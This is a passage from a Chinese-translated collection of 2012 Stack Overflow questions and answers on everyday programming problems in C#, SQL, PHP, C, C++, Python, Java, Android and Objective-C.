    <hello4>444</hello4>
  </product_Price> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T01:57:55.507

如果您只想获取内部 xml，可以使用 XmlReader 的`ReadInnerXml`.innerXML 作为字符串获取（跳过根节点）。

```
var xmlReader = XElement.Load("data.xml").CreateReader();
xmlReader.MoveToContent();
string innerXml = xmlReader.ReadInnerXml(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T00:39:27.807

如果您有权访问 Linq to XML，您应该`XDocument`.
*警告：我相信你的 xml 格式错误 - 你应该有类似的东西：*

```
<?xml version="1.0" encoding="utf-8"?> 
```

将第一个 xml 标记添加到 xml。

```
string xml = @"<?xml version="1.0" encoding="utf-8"?>
               <Employees>
                 <Product_Name>
                    <hello1>product1</hello1>
                    <hello2>product2</hello2>
                    <hello3>product3</hello3>
                    <hello4>product4</hello4>
                 </Product_Name>
                 <product_Price>
                    <hello1>111</hello1>
                    <hello2>222</hello2>
                    <hello3>333</hello3>
                    <hello4>444</hello4>
                 </product_Price>
              </Employees>";

XDocument xDoc = XDocument.Parse(xml);

// get the elements
var rootElements = xDoc.Root.Elements(); 
```

或者，您可以从文件加载 xml：

```
XDocument xDoc = XDocument.Load("xmlFile.xml"); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T00:27:27.287

您可以将其存储为格式正确的[XmlNodeList](http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CDMQFjAA&url=http://msdn.microsoft.com/en-us/library/system.xml.xmlnodelist.aspx&ei=EZShUJzzEqeJiwLfr4GYAw&usg=AFQjCNFfmOyM8-Gehnm6IMxxzcDrxgyinw&sig2=k3AmTpw1H5_z-mAoHu-9RA)。这是一个如何做到这一点的工作示例：

```
XmlDocument xml= new XmlDocument();
        xml.LoadXml(@"<Employees>
                      <Product_Name>
                        <hello1>product1</hello1>
                        <hello2>product2</hello2>
                        <hello3>product3</hello3>
                        <hello4>product4</hello4>
                      </Product_Name>
                      <product_Price>
                        <hello1>111</hello1>
                        <hello2>222</hello2>
                        <hello3>333</hello3>
                        <hello4>444</hello4>
                      </product_Price>
                    </Employees>");
        var nodeList = xml.SelectNodes("Employees");
        foreach (XmlNode node in nodeList)
        {
           Console.WriteLine(node.InnerXml); //this will give you your desired result
        } 
```

# sql - 如何使存储过程更改 SELECT 上的返回值

> ID：13353804
> 
> 赞同：0
> 
> 时间：2012-11-13T00:18:32.933
> 
> 标签：sql, sql-server, stored-procedures

我正在尝试更改存储过程返回的内容而不更改数据。我试图让它在每次 LinkItemType = 3 时返回 1，但我不断收到语法错误。请帮忙。

这就是我所拥有的。

```
DECLARE @ITEMTYPE Int

SELECT TOP 1000 
    [DataID]
    ,[ContactServiceID]
    ,[LinkID]
    ,@ITEMTYPE
    WHEN [LinkItemType] = 3 THEN @ITEMTYPE = 1 ELSE @ITEMTYPE = [LinkItemType]
FROM 
    [BCM2010].[dbo].[EntityReferences]
WHERE
    dataid = 54
ORDER BY 
    LinkItemType DESC 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:28:44.833

劳伦斯说的是对的。您正在寻找的可能是：

*（注意，我没有使用你的变量）*

```
SELECT TOP 1000 [DataID]
  ,[ContactServiceID]
  ,[LinkID]
  ,ITEMTYPE = CASE WHEN [LinkItemType] = 3 THEN 1 ELSE [LinkItemType] END
 FROM [BCM2010].[dbo].[EntityReferences]
 WHERE dataid = 54
 ORDER BY ITEMTYPE DESC 
```

# php - 通过变量键将多数组拆分为单独的数组

> ID：13353805
> 
> 赞同：0
> 
> 时间：2012-11-13T00:18:34.977
> 
> 标签：php, split, key

假设我有：

```
Array
    (
        [some_title] => Array
        (
            [0] => blah blah blah
            [1] => More blah.
            [2] => Stuff and things
        )

        [diff_random_name] => Array
        (
            [0] => blooh blah
        )

        [totally_new_name] => Array
        (
            [0] => interesting insights
            [1] => other.
        )
    ) 
```

我怎样才能将所有这些带标题的数组敲入它们自己单独的数组中？所以它将是 some_title 及其值的一个数组，以及 diff_random_name 等之一。名称每次都是动态生成的，每个子数组的计数也会发生变化。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:28:55.443

```
foreach($base as $key=>$value)
{
    $$key = $value;
} 
```

假设 $base 是带有子数组的原始数组的名称，您应该能够使用 $$ 将 $key 变量视为新数组的名称，这将为您提供所需的新数组。

# c - 什么是 C 中的 char **？

> ID：13353807
> 
> 赞同：29
> 
> 时间：2012-11-13T00:18:40.300
> 
> 标签：c

> **可能重复：**
> [什么是双星？](https://stackoverflow.com/questions/604099/what-is-double-star)

我对C相当陌生，并且遇到过这个声明

```
typedef char **TreeType 
```

我很清楚 typedef 的作用，但我以前从未见过 char**。我知道 char* 是一个字符数组或类似于字符串。我不确定 char** 是二维字符数组还是指向字符数组的指针。我环顾四周，但找不到它是什么。如果您能解释一下 char** 是什么或指出我正确的方向，我们将不胜感激。

谢谢！:)

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-13T00:31:05.587

从技术上讲，`char*`不是数组，而是指向 a 的指针`char`。

同样，`char**`是一个指向 a 的指针`char*`。使其成为指向 a 的指针的指针`char`。

C 和 C++ 都在幕后将数组定义为指针类型，所以是的，这个结构很可能是`char`s 数组或字符串数​​组。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-13T00:22:40.973

它是一个指向指针的指针，所以是的，在某种程度上它是一个二维字符数组。就像 a`char*`可以表示一个 s 的数组一样`char`，a`char**`可以表示它指向一个`char*`s 的数组。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-13T00:33:05.283

好吧，`char *`表示指向 char 的指针，它与 char 数组不同。

```
char amessage[] = "this is an array";  /* define an array*/
char *pmessage = "this is a pointer"; /* define a pointer*/ 
```

并且，`char **`表示指向 char 指针的指针。

您可以查看一些有关指针和数组的详细信息的书籍。

# python - 如何使用 Python 2.7 处理 MS Word 文本框

> ID：13353814
> 
> 赞同：1
> 
> 时间：2012-11-13T00:19:14.630
> 
> 标签：python, python-2.7

> **可能重复：**
> [如何使用 Python 在 MS Word 文本框中进行搜索和替换](https://stackoverflow.com/questions/13337961/how-to-search-and-replace-in-ms-word-textbox-using-python)

如何使用 Python 在 MS Word 中操作文本框 你好，我是 python 的新手。我想在数百个 msword 文件中做一些自动化工作。我需要做大量的搜索和替换工作。

我从网上得到了一个例子。所以我可以在数百个 msword 文件中用 BBB 替换原始字符串 AAA。但是它不能替换文本框中的字符串。几乎让我发疯，很难找到解决方案。

  我的 Python 版本是 2.7，我的文件中包含以下库。我仍然无法在 word 文件中显示每个文本框的文本

我尝试了解决方案[Python win32com - 自动化 Word - 如何替换文本框中的文本？](https://stackoverflow.com/questions/3022898/python-win32com-automating-word-how-to-replace-text-in-a-text-box) 但它没有用

```
canvas = word.ActiveDocument.Shapes[0]
for item in canvas.CanvasItems:
    print item.TextFrame.TextRange.Text 
```

即使我可以得到画布对象，但在上面的“FOR 循环”中，我会得到错误异常。它似乎没有那些成员。

有没有人可以给我一些具体的例子，或者 Windows 中其他流行的框架或库来处理 MS Word/Excel。提前谢谢你……非常感谢~

以下是错误，看来我试图访问不存在的属性。

```
 Traceback (most recent call last):
  File "a.py", line 108, in <module>
    main()
  File "a.py", line 86, in main
    AppWord = ReadWrod(docPath)
  File "a.py", line 51, in ReadWrod
    testTB(doc)
  File "a.py", line 22, in testTB
    print doc.Shapes[0].TextFrame.TestRange.Text
  File "C:\Python27\lib\site-packages\win32com\client\dynamic.py", line 522, in __getattr__
    raise AttributeError("%s.%s" % (self._username_, attr))
AttributeError: <unknown>.TestRange 
```

# php - 从PHP中的字符串中提取数组中预定义短语的精确匹配

> ID：13353815
> 
> 赞同：1
> 
> 时间：2012-11-13T00:19:19.513
> 
> 标签：php, arrays, string

需要`$new_string`输出`New York NY`但我得到`New York NY York NY`

```
$phrases = array("New York NY","York NY","Wyoming MI","Wyoming Minnesota");
$string = ("I live in New York NY");

$matches = array();
foreach($phrases as $phrase) {
    if(stripos($string,$phrase) !== false){
        $matches[] = $phrase;
    }
}

$new_string = implode(" ",$matches);

echo $new_string; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:45:52.210

两者都是`stripos("I live in New York NY", "New York NY")`_`stripos("I live in New York NY", "York NY")``!=== false`

您可以创建一个只支持较长文本的循环

```
$phrases = array("New York NY","York NY","Wyoming MI","Wyoming Minnesota");
$string = ("I live in Wyoming Minnesota");
$matches = array();
foreach ( $phrases as $phrase ) {
    $phrase = preg_quote($phrase, '/');
    if (preg_match("/\b$phrase\b/i", $string)) {
        $matches[] = $phrase;
    }
}
echo "<pre>";
print_r($matches); 
```

输出

```
Array
(
    [0] => Wyoming Minnesota
) 
```

preg_match / 如果可选分隔符 [@DaveRandom](https://stackoverflow.com/users/889949/daverandom)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:23:15.723

那是因为它正在查看是否`$phrase`在您的`$string`.

`New York NY`和都`York NY`在 中找到`$string`，因此它们都被添加到`$matches`.

* * *

我不确定“大图”是什么，但您可能想`$string`分成两部分，然后只比较位置：

```
$places = array("New York NY","York NY","Wyoming MI","Wyoming Minnesota");
$strLive = "I live in ";
$strLoc = "New York NY";

$matches = array();
foreach($places as $place) {
    if($strLoc == $place){
        $matches[] = $place;
    }
} 
```

# c++ - 操作标准一维数组时忽略前导空格

> ID：13353821
> 
> 赞同：1
> 
> 时间：2012-11-13T00:19:38.873
> 
> 标签：c++, arrays, whitespace

在这种情况下，我们必须从一个名为 small.txt 的文件中读取。该文件的内容如下所示：

```
NOT      11010011
AND      10010010  11001110
OR       10011001  11100101
CONVERT  10010110
LSHIFT   11001101  3
WRONG    01010100  10101010 
```

每个单词都表示该文件中新行的开始。我遇到的问题是让我的代码在最后（第 3 列）中读取。每列长度为十个空格。以下是我必须遵守的规则：

根据文件中的命令，对命令后面的操作数进行操作。每个命令都独立于另一个命令，因此一个命令不能影响另一个命令。

这些命令都是二进制命令，但你不能为此使用 C++ 的内置命令。这意味着没有：“~、&、|、<<（用作二元运算符时）”。你当然可以使用 && 和 ||，它们是不同的。<< 可以像往常一样用于 cout，只是不能用作二元运算符。

您不能使用字符串来读取操作数。

我努力了：

```
inputFile.ignore(20, '\n') 
```

但如果这是正确的方法。我没有正确使用它。

这是我的代码：

```
/*
       ====================================================================
                                                                                     SUMMARY 

Read commands which will require the program to perform some operation on either one or two bit 
patterns, determine the result of the operation, and output accordingly. 

NOT: 

Takes 1 operand and performs a bitwise logical NOT. At each position, if the operand has a 0, 
the result will contain a

1\. If the operand has a 1, the result will contain a 0.

Eg. operand 11010011
result 00101100

In logical operations, a 1 represents TRUE and a 0 FALSE.

AND:

Takes 2 operands and performs a bitwise logical AND. At each position, if both operand 1 and 
operand 2 contain a 1, the result will be a 1\. Otherwise the result is 0.

Eg. operand 1 10010010
operand 2 11001110
result 10000010

OR:

Takes 2 operands and performs a bitwise logical OR. At each position, if either operand 1 or 
2 or both contain a 1, the result will contain a 1\. Otherwise the result will contain a 0 
(inclusive OR).

Eg. operand 1 10011001
operand 2 11100101
result 11111101

CONVERT:

Takes 1 operand and converts it to a base 10 integer. Note: we will let every bit in these 
binary numbers represent part of a positive binary integer, i.e. there is no "sign" bit. 
Thus we can only represent positive integers in the range from 0 thru (28 - 1).

Eg. operand 10010110
result = (1 * 2**7) + (0 * 2**6) + (0 * 2**5) + (1 * 2**4)
+ (0 * 2**3) + (1 * 2**2) + (1 * 2**1) + (0 * 2**0) = 150 in base 10

LSHIFT:

Logical Shift to Left Takes 1 operand and an integer N as input. The bit values are shifted N 
positions to the left. Data "pushed off" the left end is lost. Zeroes replace the lost bits.

Eg. operand 1 11001101 N = 3
result 01101000
You may assume N is valid, i.e. 0 <= N <= 8

   ======================================================================
                                                                                   ASSUMPTIONS 

The binary operands will contain exactly 8 bits, where a bit is a binary digit. A byte contains 
8 bits.

Check for invalid command names. Assume that the binary operands are all correctly given in the 
data file.

   ======================================================================
                                                                                      INPUT 

From the data file binaryData.txt.

   =======================================================================
                                                                                     OUTPUT 

Echo print all input values. Then output in a suitable fashion the results of the operation
performed, and any necessary error messages.

*/

/* ========================================================================================*/
/*                                           HEADER FILES                              */

#include <iomanip>                                 // needed for output manipulation
#include <iostream>                    // needed for standard I/O routines
#include <fstream>
#include <string>                                 // needed for reading data from files
using namespace std;

/* ====================================================================================*/
/*                   FUNCTION                                                         /* ================================================================== */
/*            NAMED GLOBAL CONSTANTS                                                   */             

    const int ARRAY_SIZE = 8;                        // array size  

/* =========================================================================== */
/*       MAIN FUNCTION                                                          */
    int main (){

int numbers[ARRAY_SIZE];                        // array with 8 elements
int secondArray[ARRAY_SIZE];                    // array two with 8 elements
int thirdArray[ARRAY_SIZE];                    // array three with 8 elements 
int count = 0;                                 // loop counter variable

ifstream inputFile;                           // input file stream object

// open the file
inputFile.open ("small.txt");

// exit if a fatal error occurs opening the file
if( !inputFile ){

    cout << "Error: Data file could not be opened \n";
    system ("pause");
    return (EXIT_FAILURE);

} // end of not in file if statement

// read the array

string word;

while(inputFile){

    // stores the word read in by the file 
    inputFile >> word;

    if(word == "NOT"){

   cout << word << "     ";

   // This allows you to be able to read in each number one by one
   for(int i = 0; i < ARRAY_SIZE; i++){ 

       char letter(20);

       inputFile >> letter;
       letter = letter - '0';
       numbers[i] = static_cast<int>(letter);

       if (letter == 0){

           numbers[i] = letter + 1;
       }
       else{

           numbers[i] = letter - 1;
       }

    } // end of first for loop 

    for(int i = 0; i < ARRAY_SIZE; i++){

       cout << numbers[i];
     } // end of second for loop 
    } // end of if word == not check

    if(word == "AND"){

   cout << "\n\n" << word << "     ";

   // This allows you to be able to read in each number one by one
   for(int i = 0; i < ARRAY_SIZE; i++){ 

       //inputFile.ignore(20, '\n');

       char letter;

       inputFile.ignore(10) >> letter;
       letter = letter - '0';
       secondArray[i] = static_cast<int>(letter);

    } // end of first for loop 

    for(int i = 0; i < ARRAY_SIZE; i++){

       cout << secondArray[i];
     } // end of second for loop 
    } // end of if word == not check
} // end of while inputFile loop

inputFile.clear ( );
inputFile.close ( );

cout << endl;
system ("pause");
return (0);

    } // end of main function 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T01:47:36.460

您的代码已经使用了流中的前两列，并且流的位置超过了这些列。反过来，不必调用 ignore 来将流位置移动到这些列之外。除了忽略[ifstream](http://www.cplusplus.com/reference/iostream/ifstream/)之外，它还提供了一些您可能会觉得有用的附加功能。

# image - 从 URL 获取图像到目录

> ID：13353828
> 
> 赞同：0
> 
> 时间：2012-11-13T00:20:19.077
> 
> 标签：image, url

好吧，直截了当，我想放一个URL，并获取这个URL中的所有图像，例如

www.blablabla.com/images

在此图像文件夹中，我想获取所有图像...我已经知道如何从特定 URL 获取图像，但我不知道如何获取所有图像而无需直接进入确切路径，有没有办法获取 URL 路径或类似内容中的所有项目的列表？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:30:13.293

嗯，基本上，这是做不到的。好吧，无论如何在正常情况下都不会。问题是您不知道该目录中有哪些文件。

...除非服务器有“目录列表”。这被认为是一个安全漏洞，因此出现这种情况的可能性并不太高。（这个想法是您公开了您不必公开的有关您的服务器的详细信息，虽然它本身没有问题，但它可能会使世界知道可能成为安全问题的事情。）

这意味着如果服务器是您的，您可以打开目录列表，或者当服务器恰好打开时，您可以访问 url (www.blablabla.com/images) 并查看所有文件的列表在那个目录中。这看起来并不总是完全相同，但一般情况下，您将获得一个 html 页面，其中包含指向目录中所有文件的链接。因此，您需要做的就是检索页面并解析链接，最后得到您想要的图像的 url。

如果服务器是您的，我建议至少查看您可能拥有的任何其他选项。一种这样的选择可能是制作一个提供所有 url 而不是依赖目录列表的脚本。这没有目录列表所具有的一些更不幸的含义（例如显示恰好位于同一目录中的非图像）并且可以更加灵活。

另一种方法可能是使用不同于 HTTP 的协议，如 FTP、SFTP 或 SCP。这些协议没有脚本那样的灵活性，但它们确实具有更高的安全性，因为它们可以轻松地将目录列表和图像的访问限制为只有具有正确登录详细信息（或私钥）的人才能访问。（当然，如果这样的协议可供您使用并且它不是您自己的服务器，您也可以使用它们。）

# java - java.lang.Error：无效的 UTF-8 编码

> ID：13353831
> 
> 赞同：1
> 
> 时间：2012-11-13T00:20:51.257
> 
> 标签：java, utf-8, finance, fix-protocol

我在尝试通过我的交易应用程序处理交易以及与 FIX 通信时收到此错误。

```
 java.lang.Error: Invalid UTF-8 Encoding
     at javolution.io.Struct$UTF8String.get(Struct.java:1105) 
```

我使用 UTF-8 编码，它已在我的应用程序的每个 POM 文件中指定。当交易进入应用程序时就会发生这种情况。有没有人遇到过这个错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T06:01:27.847

### 更新：

看起来您遇到的是几个现有的错误：[在处理 Struct 类中的 UTF8Strings](http://java.net/jira/browse/JAVOLUTION-41)和[XMLStreamReaderImpl 忽略 xml 编码属性时出错？](http://java.net/jira/browse/JAVOLUTION-43)

> 将某些字符串传递给 UTF8String 设置方法会导致超出支持 ByteBuffer 中 UTF8String 映射到的内存块的字段边界。这似乎是由于扩展字符串的某些 UTF-8 多字节字符造成的。

* * *

您正在处理的数据似乎有问题，或者库中存在错误。看一下[UTF8ByteBufferReader 的源代码](https://svn.java.net/svn/javolution~svn/trunk/javolution/core-java/src/main/java/javolution/io/UTF8ByteBufferReader.java)。从以下方法抛出异常

> private int read2(byte b) 抛出 IOException

在该方法的底部，您会看到

> throw new CharConversionException("无效的 UTF-8 编码");

我会仔细检查您收到的数据实际上是 UTF-8，因为该库似乎不认为它是......

* * *

如果您所做的只是尝试解码 UTF8 流，那么您可以使用常规 Java。网上有很多[UTF8 的例子。](https://stackoverflow.com/questions/4964640/reading-inputstream-as-utf-8)此外，您可能需要使用 Apache 的[BOMInputStream](http://commons.apache.org/io/api-2.4/org/apache/commons/io/input/BOMInputStream.html)。

您也可以只读取字节并定期使用[StandardCharsets.UTF_8](http://docs.oracle.com/javase/7/docs/api/java/nio/charset/StandardCharsets.html#UTF_8)的[Charset#decode](http://docs.oracle.com/javase/7/docs/api/java/nio/charset/Charset.html#decode%28java.nio.ByteBuffer%29)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-01T15:25:57.577

FIX 标准使用 ASCII，而不是 UTF-8。

# msbuild - 协助 fxcop

> ID：13353834
> 
> 赞同：0
> 
> 时间：2012-11-13T00:21:02.637
> 
> 标签：msbuild, code-analysis, tfsbuild, fxcop

我目前正在开发一个与一组 wcf 服务通信的 mvc4 项目。我正在为一组开发人员在 tfs build 中进行设置。

一般来说，我是 fxcop 和代码分析的新手。我目前正在研究它，并在此之后有一些问题：

*   是否推荐使用 fxcop 自带的规则？
*   是否应该在构建期间将其作为构建任务包含在内？
*   它的价值是什么？
*   是否有关于遵守哪些规则的指导方针，或者最好使用默认规则？
*   将分析作为构建后事件运行是否正确？

我是 fxcop 的新手，希望得到一些反馈。我正在将 stylecop 集成到我的构建中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T04:40:16.980

看看这个被黑客攻击的博客文章：[http :](http://haacked.com/archive/2012/07/05/turkish-i-problem-and-why-you-should-care.aspx) [//haacked.com/archive/2012/07/05/turkish-i-problem-and-why-you-should-care.aspx](http://haacked.com/)。

我认为它回答了你的大部分问题。一些指针是：

**是否推荐使用 fxcop 自带的规则？**

对于一个新项目，我会启用所有规则，并随着时间的推移禁用那些你觉得分散注意力的规则。对于现有项目，我会启用最少的规则，并随着时间的推移慢慢添加新规则并根据需要清理代码。

代码分析规则为：

*   [设计警告](http://msdn.microsoft.com/en-us/library/ms182125)
*   [全球化警告](http://msdn.microsoft.com/en-us/library/ms182184)
*   [互操作性警告](http://msdn.microsoft.com/en-us/library/ms182193)
*   [可维护性警告](http://msdn.microsoft.com/en-us/library/ms182211)
*   [移动警告](http://msdn.microsoft.com/en-us/library/ms182218)
*   [命名警告](http://msdn.microsoft.com/en-us/library/ms182232)
*   [性能警告](http://msdn.microsoft.com/en-us/library/ms182260)
*   [可移植性警告](http://msdn.microsoft.com/en-us/library/ms182282)
*   [可靠性警告](http://msdn.microsoft.com/en-us/library/ms182287)
*   [安全警告](http://msdn.microsoft.com/en-us/library/ms182296)
*   [使用警告](http://msdn.microsoft.com/en-us/library/ms182324)

**是否应该在构建期间将其作为构建任务包含在内？**

是的。这是我使用的方法：http: [//kentb.blogspot.co.nz/2011_01_01_archive.html](http://kentb.blogspot.co.nz/2011_01_01_archive.html)

如果您的 IDE 支持，它可以通过 UI 启用。但是，当不同的项目使用不同的规则集时（例如，单元测试项目可能更宽松），我遇到了问题。kentb 博客中的程序解决了这个问题。

或者，您可以直接从构建后事件调用 FxCop。

**它的价值是什么？**

结构良好的代码和减少的生产问题。

**是否有关于遵守哪些规则的指导方针，或者最好使用默认规则？**

再次 - 选择适合你的任何东西。例如，您可能不在乎二进制文件不是强命名的。黑客攻击的博客文章有一些很好的指导。

**将分析作为构建后事件运行是否正确？**

如果您关注 kentb 的博客文章，或通过 IDE GUI 启用它（假设您的 IDE 支持它），那么它将作为构建过程的一部分运行。如果您直接调用 FxCop，则需要将其作为构建后事件来完成。

# graphics - Java 绘画问题

> ID：13353835
> 
> 赞同：0
> 
> 时间：2012-11-13T00:21:02.833
> 
> 标签：graphics, paint, repaint

我需要有关“绘画”程序的帮助。我已经建立了 GUI，但是程序的实际绘图部分存在问题。我画的所有东西在我画完之后立即消失了，我不知道为什么。

这是我到目前为止所拥有的：

```
import java.awt.*;
import java.awt.event.*;

import javax.swing.*;

public class JPaint extends JFrame implements ActionListener, MouseListener, MouseMotionListener {

int x, y, x2, y2;
private int select = 0;
private Graphics g;
private PaintPanel DrawPanel = new PaintPanel(this);
private JPanel ButtonPanel = new JPanel();
private JTextArea Draw = new JTextArea(20,20);
private JButton jbtRed = new JButton("Red");
private JButton jbtGreen  = new JButton("Green");
private JButton jbtBlue  = new JButton("Blue");
private JButton jbtErase  = new JButton("Eraser");
private JButton jbtClear  = new JButton("Clear");
PaintPanel l=new PaintPanel(this);

public JPaint(){
    super("Java Paint");
    setSize(480,320);
    setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);

    //build draw panel
    DrawPanel.setBackground(Color.WHITE);

    add(DrawPanel, BorderLayout.CENTER);
    DrawPanel.setVisible(true);
    //build button panel

    ButtonPanel.add(jbtRed);
    ButtonPanel.add(jbtGreen);
    ButtonPanel.add(jbtBlue);
    ButtonPanel.add(jbtErase);
    ButtonPanel.add(jbtClear);

    add(ButtonPanel, BorderLayout.SOUTH);
    ButtonPanel.setVisible(true);

    jbtRed.addActionListener(this);
    jbtGreen.addActionListener(this);
    jbtBlue.addActionListener(this);
    jbtErase.addActionListener(this);
    jbtClear.addActionListener(this);
    DrawPanel.addMouseMotionListener(this);
    DrawPanel.addMouseListener(this);

}

         public void actionPerformed(ActionEvent e){

             if(e.getSource() == jbtRed){
                 DrawPanel.setToolTipText("Color set to 'Red'");
                 select = 1;
                 }
             if(e.getSource() == jbtGreen){
                 DrawPanel.setToolTipText("Color set to 'Green'");
                 }
             if(e.getSource() == jbtBlue){
                 DrawPanel.setToolTipText("Color set to 'Blue'");
                 }
             if(e.getSource() == jbtErase){
                 DrawPanel.setToolTipText("Erase Selected");
                 }
             if(e.getSource() == jbtClear){
                 DrawPanel.setToolTipText("Drawing cleared");
                 }

         }

@Override
public void mouseDragged(MouseEvent e) {

    x = e.getX();
    y = e.getY();
    DrawPanel.repaint();

}

@Override
public void mouseMoved(MouseEvent e) {

}

@Override
public void mouseClicked(MouseEvent e) {

}

@Override
public void mouseEntered(MouseEvent e) {
    // TODO Auto-generated method stub

}

@Override
public void mouseExited(MouseEvent e) {
    // TODO Auto-generated method stub

}

@Override
public void mousePressed(MouseEvent e) {

    x = e.getX();
    y = e.getY();

}

@Override
public void mouseReleased(MouseEvent e) {

    x2 = e.getX();
    y2 = e.getY();
    DrawPanel.repaint();

}

}

         class PaintPanel extends JPanel
            {
                JPaint p;
                PaintPanel(JPaint in){
                    p=in;
                }
                public void paintComponent(Graphics g)
                {

                    super.paintComponent(g);

                    // clear the screen
                    g.setColor(Color.white);

                    g.setColor(Color.RED);
                    g.drawLine(p.x, p.y, p.x2, p.y2);

                    p.x2 = p.x;
                    p.y2 = p.y;

            }

}

         class Run_JPaint {

                public static void main(String[] args){

                    JPaint P = new JPaint();

                    P.setVisible(true);

                }
            } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:59:20.810

您可能希望删除以下代码行： super.paintComponent(g); 从您的 PaintPanel 类内部。否则，对于每个绘制命令，您的 GUI 都会重置屏幕。

祝你好运！

# android - OutOfMemeryError 来自在某些设备中拍摄照片 android

> ID：13353839
> 
> 赞同：3
> 
> 时间：2012-11-13T00:21:39.400
> 
> 标签：android, camera, out-of-memory

在某些设备和 Android 版本中使用相机拍照时出现问题。例如，在我的 Xperia U v4.0.3 中，我的代码运行良好，但在另一个 xperia U v2.3.3 中却无法运行......

我读了很多关于这个错误的信息，但我无法修复它......

我拍照并显示的代码：

```
public void callCamera(){
Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
File photo = new File(Environment.getExternalStorageDirectory(),  "Pic.jpg");
intent.putExtra(MediaStore.EXTRA_OUTPUT,
Uri.fromFile(photo));
imageUri = Uri.fromFile(photo);
startActivityForResult(intent, SELECT_CAMERA);
}

public void onActivityResult(int requestCode, int resultCode, Intent data) {
            if (requestCode == SELECT_CAMERA) {

                Uri selectedImage = imageUri;
                getContentResolver().notifyChange(selectedImage, null);

                ContentResolver cr = getContentResolver();

                try {

                    imageSelected = android.provider.MediaStore.Images.Media
                     .getBitmap(cr, selectedImage);
                    // I tried to read the image created for the camera in the Sd
                    //But I've got the same error... 
                    //imageSelected = Utils.readImageSD(this, selectedImage.getPath());

                     imageSelected = Utils.rotateImage(Utils.scaleBitmap(imageSelected, 160, 160));
                     ivImageLoad.setImageBitmap(imageSelected);

                } catch (Exception e) {
                    Utils.showToast(getApplicationContext(), R.string.errorLoad);
                    Log.e("Camera", e.toString());
                }

            }

} 
```

我希望有人可以帮助我......我不知道我能做什么......

提前致谢。

问候。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T01:55:01.530

看起来您只想显示 160x160 位图，但在这一行中，您正在读取整个位图，然后将其缩小。

```
imageSelected = android.provider.MediaStore.Images.Media(cr, selectedImage); 
```

您可以避免使用 inJustDecodeBounds 将整个位图加载到内存中[，](http://developer.android.com/reference/android/graphics/BitmapFactory.Options.html#inJustDecodeBounds)然后您可以使用[inSampleSize](http://developer.android.com/reference/android/graphics/BitmapFactory.Options.html#inSampleSize)对其进行缩放。

这是 Android 系列中有关[有效加载大型位图的一些示例代码](http://developer.android.com/training/displaying-bitmaps/load-bitmap.html)

```
public static int calculateInSampleSize(BitmapFactory.Options options, int reqWidth, int reqHeight) {
    // Raw height and width of image
    final int height = options.outHeight;
    final int width = options.outWidth;
    int inSampleSize = 1;

    if (height > reqHeight || width > reqWidth) {
        if (width > height) {
            inSampleSize = Math.round((float)height / (float)reqHeight);
        } else {
            inSampleSize = Math.round((float)width / (float)reqWidth);
        }
    }
    return inSampleSize;
}

public static Bitmap decodeSampledBitmapFromUri(Uri uri,
        int reqWidth, int reqHeight) {

    // First decode with inJustDecodeBounds=true to check dimensions
    final BitmapFactory.Options options = new BitmapFactory.Options();
    options.inJustDecodeBounds = true;
    BitmapFactory.decodeStream(getContentResolver().openInputStream(uri), options);

    // Calculate inSampleSize
    options.inSampleSize = calculateInSampleSize(options, reqWidth, reqHeight);

    // Decode bitmap with inSampleSize set
    options.inJustDecodeBounds = false;
    return BitmapFactory.decodeStream(getContentResolver().openInputStream(uri), null, options);
} 
```

然后要获得 160x160 图像，您只需执行以下操作：

```
ivImageLoad.setImageBitmap(decodeSampledBitmapFromUri(selectedImage, 100, 100)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:26:24.167

也许问题的根源是默认的堆大小。增加它的方法有：

对于 Android 2.2 或更低版本：

```
dalvik.system.VMRuntime.getRuntime().setMinimumHeapSize(sizeInBytes); 
```

对于 Android [2.3 或更高版本](http://developer.android.com/reference/android/R.styleable.html#AndroidManifestApplication_largeHeap)：

```
android:largeHeap="true" 
```

检查问题的根源是否是这个，相应地增加堆。

# objective-c - 由于 SIGABRT 异常，无法更改方法中的 UILabel 文本。怎么了？

> ID：13353845
> 
> 赞同：0
> 
> 时间：2012-11-13T00:22:07.457
> 
> 标签：objective-c, ios, exception, uilabel

我正在创建一个自定义 UITableViewCell 视图。我有一个方法，`UITableViewCell`并且我以`UILabel` `memberLabel`编程方式创建了：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath  {

static NSString * const cellIdentifier = @"cellMemberId";

CPNMemberCell *cell = (CPNMemberCell *) [tableView dequeueReusableCellWithIdentifier:cellIdentifier];

if (!cell) {

    [[NSBundle mainBundle] loadNibNamed:@"TeamCell" owner:self options:nil];
    cell = baseCell;
}

memberLabel = [[UILabel alloc] initWithFrame:CGRectMake(32, 19, 183, 27)];
[cell addSubview:memberLabel];

NSString * const test = @"test input";
memberLabel.text = test;

  return cell;
} 
```

所以这段代码工作得很好。但是当我在 MutableDictionary 中将测试字符串值更改为包含 JSON 响应的字符串时，一切都失败了。我专门将该字符串输出到控制台日志，以确保它不为空或其他。在将该字符串分配给 UILabel 期间，我有一个例外：

```
NSString * const test = [members valueForKey:@"modelId"];
NSLog(@"Output: %@", test);
memberLabel.text = test; 
```

